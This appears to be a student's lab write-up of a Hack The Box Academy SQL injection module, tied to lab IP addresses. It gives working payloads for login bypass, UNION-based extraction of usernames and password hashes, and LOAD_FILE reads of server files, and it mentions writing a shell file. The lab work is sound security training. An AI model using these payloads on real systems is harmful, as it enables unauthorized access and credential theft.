In this module I will learn how to recognize vulnerable code, execute SQL injection attacks, and understand the potential impact on data confidentiality and integrity. Mastering SQL injections will definitely equip me with crucial skills for identifying, preventing, and mitigating these security risks.

Intro to MySQL
I logged in using the command “mysql -u root -h 94.237.59.206 -P 50729 -p” to gain access to the DB, then used “Show databases;” command to view the available DBs.
 
SQL Statements
 
Query Results
  Using the commands “select * from employees first_name like 'Bar%' AND hire_date like '1990-01-01';” I was able o get the employee’s name.
SQL Operators
 
Using select * from titles where title NOT LIKE '%Engineer%' or emp_no >10000;
 
Subverting Query Logic
 Used the command “tom ' or '1'='1” in order to login.  
Using Comments
 
 
Union Clause
 
 
Used the command “select dept_no from departments UNION select emp_no from employees;” to get the total number of records.


 Union Injection
             After adding the injection ‘user()’ in the address I go the result I needed. 
Database Enumeration
 
I used http://94.237.62.49:56565/search.php?port_code=cn’ UNION select 1,username,password,4 from users-- -“  to get the password hash for the new user.
Reading Files
 
Afer using “cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -” as the injection code I found the password.  
Writing Files
 I injected the command “ cn' UNION SELECT 1, LOAD_FILE("/var/www/flag.txt"), 3, 4-- - “to get to the flag. 
Skills Assessment - SQL Injection Fundamentals
I logged in using “ admin' or '1'='1'-- - “ as the credentials.
I first wanted to know the number of columns that I am working with, I searched till ‘ORDER BY 6-- - where it returned an error simplifying that there are 5 columns. After checking the type and version in use using the command ' union select 1,user(),database(),@@version,5-- -“ I found the DB in use. 
To get the information schema I used cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -  After cheking the privilege level and granting superuser privileges, I created a shell file by adding Dashboard.   I found the flag_cae1dadcd174.txt.  
 I loaded the file to read its content ' UNION SELECT 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- - 
    
Conclusion section, written in your own words that captures a reflective summary what you have learnt and your experience.
In this module I have learnt how to navigate the shell and use it to inject malicious code in an application or a website and the best practices to follow when developing applications that are easily targeted or prone to attacks by safeguarding the said programs using various authentication methods.   https://academy.hackthebox.com/achievement/975197/33
